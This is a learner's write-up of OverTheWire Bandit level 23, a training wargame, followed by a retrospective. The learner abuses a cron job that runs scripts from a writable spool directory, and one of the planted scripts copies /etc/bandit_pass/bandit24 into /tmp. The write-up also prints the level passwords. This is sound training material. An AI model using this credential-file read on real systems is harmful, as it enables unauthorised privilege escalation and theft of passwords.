# Level 23

## Level Goal
A program is running automatically at regular intervals from cron, the
time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see
what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a
very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may
want to keep a copy around…

## Access
```
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
pwd: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

## Set Aliases and Exports
```
alias l='ls -lah --color=auto'
alias v=vim
export EDITOR=vim
```

## Review the content of the files under `/etc/cron.d`
```
tail 1 /etc/cron.d/* 2> /dev/null

==> /etc/cron.d/cronjob_bandit15_root <==
* * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null

==> /etc/cron.d/cronjob_bandit17_root <==
* * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null

==> /etc/cron.d/cronjob_bandit22 <==
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

==> /etc/cron.d/cronjob_bandit23 <==
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

==> /etc/cron.d/cronjob_bandit24 <==
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

==> /etc/cron.d/cronjob_bandit25_root <==
* * * * * root /usr/bin/cronjob_bandit25_root.sh &> /dev/null
```
`* * * * *` It runs every minute.

## Identify the files used in cron
```
more $(ls /usr/bin | grep -Eo "cronjob_bandit[0-9]{1,2}(_root)?.sh" | awk '{print "/usr/bin/"$1}' | paste -s) 2> /dev/null | cat

::::::::::::::
/usr/bin/cronjob_bandit23.sh
::::::::::::::
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
::::::::::::::
/usr/bin/cronjob_bandit24.sh
::::::::::::::
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
This tells that scripts are executed under `/var/spool/bandit24`

Can I create and run a script under it?

## TRY to list directory content
```
l /var/spool/bandit24/

ls: cannot open directory '/var/spool/bandit24/': Permission denied
```
I can't list the directory. I still do not understand how to solve this level.

## TRY to list the parent of target directory
```
l /var/spool/

...
drwxrwx-wx 16 root bandit24 4.0K Oct  8 17:02 bandit24
drwxr-xr-x  3 root root     4.0K May  3  2020 cron
lrwxrwxrwx  1 root root        7 May  3  2020 mail -> ../mail
drwx------  2 root root     4.0K Jan 14  2018 rsyslog
```
I can write a file but can't read the directory.
I can also write in `/tmp` I'll try to output things there.

## Write a script at the target location
```
touch /var/spool/bandit24/7b51c1d6-10bd-47fc-934c-6c93421d3643.sh
chmod u+x /var/spool/bandit24/7b51c1d6-10bd-47fc-934c-6c93421d3643.sh
```

## Write a simple script that outputs to my `/tmp` folder to verify

### Create a temporary dir
```
mktemp -d

/tmp/tmp.WEZO7gGqBo
```

### Update file content
```
vim /var/spool/bandit24/7b51c1d6-10bd-47fc-934c-6c93421d3643.sh

#!/bin/bash

echo 'hello world ;)' > /tmp/tmp.WEZO7gGqBo/hello.txt
```
Wait for a full minute and verify if the file write is successful.

### Verify content if file exists
```
cat /tmp/tmp.WEZO7gGqBo/hello.txt

cat: /tmp/tmp.WEZO7gGqBo/hello.txt: No such file or directory
```
The file was not created

### Verify if the script was deleted
```
l /var/spool/bandit24/7b51c1d6-10bd-47fc-934c-6c93421d3643.sh

ls: cannot access '/var/spool/bandit24/7b51c1d6-10bd-47fc-934c-6c93421d3643.sh': No such file or directory
```
The script was already deleted but didn't execute the content.

## Understand the script snippet
The `$i` variable is the file.
The script contains this snippet:
```
# this iterates the files inside the target directory
for i in * .*;
do

# this checks if the 'file' is not the current directory (`.`) and the parent directory (`..`)
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"

# assign the user name of the file to `owner` variable
        owner="$(stat --format "%U" ./$i)"

# check if the `owner` is `bandit23` then execute the script
        if [ "${owner}" = "bandit23" ]; then

# adds timeout after the execution and will send a SIGKILL after `60` seconds
            timeout -s 9 60 ./$i
        fi

# always delete the scripts whether executed or not
        rm -f ./$i
    fi
done
```
It seems that I need to change the user to `bandit23` when 
creating the scripts.

## RETRY simple script output
```
# create temp dir
$ mktemp -d
/tmp/tmp.p58pPFb6VQ

# update script content
$ vim /tmp/tmp.p58pPFb6VQ/08de8a6f-ad62-4ed2-a23d-24e4388eedca.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.p58pPFb6VQ/out

# update permission
$ chmod +rwx /tmp/tmp.p58pPFb6VQ/08de8a6f-ad62-4ed2-a23d-24e4388eedca.sh

# create output file
$ touch out
$ chmod +rw out

# copy script to the target directory
$ cp /tmp/tmp.p58pPFb6VQ/08de8a6f-ad62-4ed2-a23d-24e4388eedca.sh /var/spool/bandit24

# verify copied script
$ l /var/spool/bandit24/08de8a6f-ad62-4ed2-a23d-24e4388eedca.sh
```
Wait for a full minute.

## Verify content if file exists
```
cat /tmp/tmp.p58pPFb6VQ/out

```
The file was still not written 😭

## Update temporary folder permission
```
chmod +rwx /tmp/tmp.p58pPFb6VQ
```

## RETRY copy script to target directory
```
cp /tmp/tmp.p58pPFb6VQ/08de8a6f-ad62-4ed2-a23d-24e4388eedca.sh /var/spool/bandit24
```

## Verify content if file exists
```
cat /tmp/tmp.p58pPFb6VQ/out

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

# Flag
```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

# Retospective

## What went well?
* Somewhat knows how to read the script, I was just not familiar with the
  `timeout` command, but managed to learn about it with man pages.


## What could have gone better?
* If I could have recalled earlier that I have to also update the permission of my temporary directory.
I assumed that it'll work out of the box as I've used the `mktemp -d` and
couldn't properly check the permission with `ls -lah /tmp` as the user doesn't
have any permission. What helped me was the dot (`.`) file inside my temporary
directory and it actually shows the permission of the folder that gave a hint
why my script couldn't write to my `out` file.


## What might I need to learn for better mastery, or what strategies might I use the next time to get better results?
* Improve more about user permissions
* Scan more about the file conditions as I do not know what `-a` is inside the
  condition. But it was actully just the logical AND (`&&`).

## How other people solved this?

### [</ OverTheWire > Bandit Level 23 → Level 24](https://medium.com/@theGirlWhoEncrypts/overthewire-bandit-level-23-level-24-c67edb0abad0) by </ The Girl Who Encrypts >

Similar to what I did but they have figured out earlier about the permissions
in the directory.

